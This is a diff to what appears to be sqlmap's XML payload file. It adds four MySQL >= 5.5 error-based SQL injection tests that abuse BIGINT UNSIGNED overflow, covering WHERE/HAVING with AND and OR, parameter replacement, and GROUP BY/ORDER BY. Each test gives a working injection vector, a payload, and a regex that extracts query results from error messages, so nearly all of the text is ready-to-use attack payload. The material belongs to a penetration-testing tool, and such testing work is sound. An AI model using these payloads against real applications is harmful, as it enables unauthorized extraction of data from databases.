@@ -1253,6 +1253,26 @@ Formats:
     </test>
 
     <test>
+        <title>MySQL &gt;= 5.5 AND error-based - WHERE or HAVING clause (BIGINT UNSIGNED)</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>0</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</vector>
+        <request>
+            <payload>AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.5</dbms_version>
+        </details>
+    </test>
+
+    <test>
         <title>MySQL &gt;= 4.1 AND error-based - WHERE or HAVING clause</title>
         <stype>2</stype>
         <level>2</level>
@@ -1467,6 +1487,26 @@ Formats:
         <details>
             <dbms>MySQL</dbms>
             <dbms_version>&gt;= 5.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>2</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</vector>
+        <request>
+            <payload>OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.5</dbms_version>
         </details>
     </test>
 
@@ -1716,6 +1756,26 @@ Formats:
     </test>
 
     <test>
+        <title>MySQL &gt;= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>0</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</vector>
+        <request>
+            <payload>(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.5</dbms_version>
+        </details>
+    </test>
+
+    <test>
         <title>PostgreSQL error-based - Parameter replace</title>
         <stype>2</stype>
         <level>3</level>
@@ -1874,6 +1934,26 @@ Formats:
         <details>
             <dbms>MySQL</dbms>
             <dbms_version>&gt;= 5.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.5 error-based - GROUP BY and ORDER BY clauses (BIGINT UNSIGNED)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>0</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</vector>
+        <request>
+            <payload>,(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.5</dbms_version>
         </details>
     </test>
 
